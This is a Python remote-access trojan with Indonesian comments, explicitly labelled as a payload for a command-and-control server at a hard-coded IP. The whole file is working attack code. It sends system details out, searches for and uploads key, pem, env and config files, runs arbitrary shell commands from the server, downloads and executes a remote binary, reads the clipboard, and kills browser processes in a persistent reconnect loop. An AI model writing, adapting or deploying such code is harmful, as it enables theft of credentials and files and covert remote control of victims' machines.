import os
import sys
import platform
import subprocess
import time

# Konfigurasi C2
C2_HOST = "192.168.0.14"
C2_PORT = 2242
C2_UPLOAD_URL = f"http://{C2_HOST}:1224/uploads"
C2_KEYS_URL = f"http://{C2_HOST}:1224/keys"
SLEEP_INTERVAL = 5

# Fungsi untuk menginstal library yang hilang
def install_library(library_name, pip_name=None):
    try:
        __import__(library_name)
        print(f"[+] {library_name} sudah terinstal")
        return True
    except ImportError:
        pip_name = pip_name or library_name
        print(f"[*] {library_name} tidak ditemukan, mencoba menginstal...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
            print(f"[+] Berhasil menginstal {pip_name}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[-] Gagal menginstal {pip_name}: {e}")
            return False

# Fungsi untuk memastikan semua dependensi terinstal
def ensure_dependencies():
    required_libraries = [
        ("requests", "requests"),
        ("pyperclip", "pyperclip")  # Opsional untuk SSH_CLIP
    ]

    all_installed = True
    for lib_name, pip_name in required_libraries:
        if not install_library(lib_name, pip_name):
            all_installed = False

    if all_installed:
        global socket, uuid, requests, glob, shutil, pyperclip
        import socket
        import uuid
        import requests
        import glob
        import shutil
        import pyperclip
        print("[+] Semua dependensi berhasil diimpor")
        return True
    else:
        print("[-] Beberapa dependensi gagal diinstal, kode mungkin tidak berjalan sepenuhnya")
        return False

# Fungsi untuk mengumpulkan informasi sistem
def collect_system_info():
    info = {
        "os": platform.system(),
        "os_version": platform.release(),
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "uuid": str(uuid.getnode()),
        "architecture": platform.machine()
    }
    return info

# Fungsi untuk mencari file sensitif
def search_sensitive_files():
    sensitive_extensions = ["*.key", "*.pem", "*.conf", "*.cfg", "*.json", "*.env"]
    sensitive_files = []
    search_dirs = [os.path.expanduser("~"), "/etc" if os.name != "nt" else "C:\\"]

    print("[*] Mencari file sensitif...")
    for base_dir in search_dirs:
        for ext in sensitive_extensions:
            try:
                files = glob.glob(os.path.join(base_dir, "**", ext), recursive=True)
                sensitive_files.extend(files)
            except Exception as e:
                print(f"[-] Error saat mencari file di {base_dir}: {e}")
    print(f"[*] Ditemukan {len(sensitive_files)} file sensitif")
    return sensitive_files

# Fungsi untuk mengunggah file ke C2
def upload_file_to_c2(filepath, url):
    try:
        print(f"[*] Mengunggah {filepath} ke {url}")
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            response = requests.post(url, files=files, timeout=10)
            if response.status_code == 200:
                print(f"[+] Berhasil mengunggah {filepath} ke C2")
            else:
                print(f"[-] Gagal mengunggah {filepath}: Status {response.status_code}")
    except Exception as e:
        print(f"[-] Error saat mengunggah {filepath}: {e}")

# Fungsi untuk mengunggah informasi sistem ke C2
def upload_system_info(info, url):
    try:
        print(f"[*] Mengunggah informasi sistem ke {url}")
        response = requests.post(url, json=info, timeout=10)
        if response.status_code == 200:
            print("[+] Berhasil mengunggah informasi sistem ke C2")
        else:
            print(f"[-] Gagal mengunggah informasi sistem: Status {response.status_code}")
    except Exception as e:
        print(f"[-] Error saat mengunggah informasi sistem: {e}")

# Fungsi untuk mengeksekusi perintah dari C2
def execute_command(command, s):
    print(f"[*] Memproses perintah: {command}")
    try:
        if command == "SEARCH_FILES":
            sensitive_files = search_sensitive_files()
            for file in sensitive_files:
                upload_file_to_c2(file, C2_UPLOAD_URL)
            return f"Uploaded {len(sensitive_files)} sensitive files"
        elif command.startswith("SSH_OBJECT:"):
            cmd = command.split(":", 1)[1]
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            return result
        elif command == "SSH_CMD":
            if platform.system() == "Windows":
                subprocess.run("taskkill /IM python.exe /F", shell=True, check=True)
                return "Terminated Python processes"
            else:
                subprocess.run("pkill -f python", shell=True, check=True)
                return "Terminated Python processes"
        elif command == "CALC":
            if platform.system() == "Windows":
                subprocess.run("calc.exe", shell=True, check=True)
                return "Calculator opened"
            else:
                return "CALC not supported on this OS"
        elif command == "SSH_KILL":
            if platform.system() == "Windows":
                subprocess.run("taskkill /IM chrome.exe /F", shell=True, check=True)
                return "Terminated browser"
            else:
                subprocess.run("pkill -f chrome", shell=True, check=True)
                return "Terminated browser"
        elif command.startswith("SSH_ANY:"):
            tool_url = f"http://{C2_HOST}:1224/adc"
            tool_path = os.path.join(os.path.expanduser("~"), "tool.exe")
            response = requests.get(tool_url, timeout=10)
            with open(tool_path, "wb") as f:
                f.write(response.content)
            subprocess.Popen([tool_path], shell=True)
            return f"Downloaded and executed {tool_path}"
        elif command == "SSH_ENV":
            env_files = [os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\Shell\\Favorites"),
                         "C:\\Windows\\System32\\drivers\\etc\\hosts"]
            for file in env_files:
                if os.path.exists(file):
                    with open(file, "r") as f:
                        requests.post("http://192.168.0.14:1224/uploads", files={"file": f})
        elif command == "SSH_CLIP":
            try:
                clipboard_data = pyperclip.paste()
                return f"Clipboard: {clipboard_data}"
            except Exception as e:
                return f"Clipboard monitoring failed: {e}"
        else:
            return f"Unknown command: {command}"
    except subprocess.CalledProcessError as e:
        return f"Command execution failed: {e.output}"
    except Exception as e:
        return f"Error executing command: {e}"

# Fungsi utama Payload
def payload():
    print("[*] Payload dimulai...")

    # Kumpulkan dan unggah informasi sistem
    system_info = collect_system_info()
    upload_system_info(system_info, C2_KEYS_URL)

    # Koneksi persisten ke C2 untuk perintah
    print("[*] Memulai koneksi persisten ke C2...")
    while True:
        try:
            print(f"[*] Mencoba terhubung ke {C2_HOST}:{C2_PORT}...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((C2_HOST, C2_PORT))
                print(f"[+] Terhubung ke C2 di {C2_HOST}:{C2_PORT}")
                s.settimeout(30)

                while True:
                    try:
                        command = s.recv(4096).decode('utf-8').strip()
                        if not command:
                            print("[-] Tidak ada perintah diterima, koneksi mungkin terputus")
                            break
                        print(f"[*] Perintah diterima: {command}")

                        result = execute_command(command, s)
                        print(f"[*] Mengirim hasil: {result}")
                        try:
                            s.send(result.encode('utf-8'))
                        except BrokenPipeError:
                            print(f"[-] Broken pipe saat mengirim hasil ke {C2_HOST}:{C2_PORT}")
                            break
                        except socket.error as e:
                            if e.error == errno.EPIPE:
                                print(f"[-] Broken pipe terdeteksi: {e}")
                                break
                            else:
                                raise

                    except socket.timeout:
                        print("[-] Timeout menunggu perintah dari C2")
                        break

        except ConnectionRefusedError as e:
            print(f"[-] Koneksi ditolak ke {C2_HOST}:{C2_PORT}: {e}")
            time.sleep(SLEEP_INTERVAL)
        except socket.error as e:
            print(f"[-] Error koneksi ke C2: {e}")
            time.sleep(SLEEP_INTERVAL)
        except Exception as e:
            print(f"[-] Error tak terduga: {e}")
            time.sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    if ensure_dependencies():
        payload()
    else:
        print("[-] Gagal menjalankan Payload karena dependensi tidak lengkap")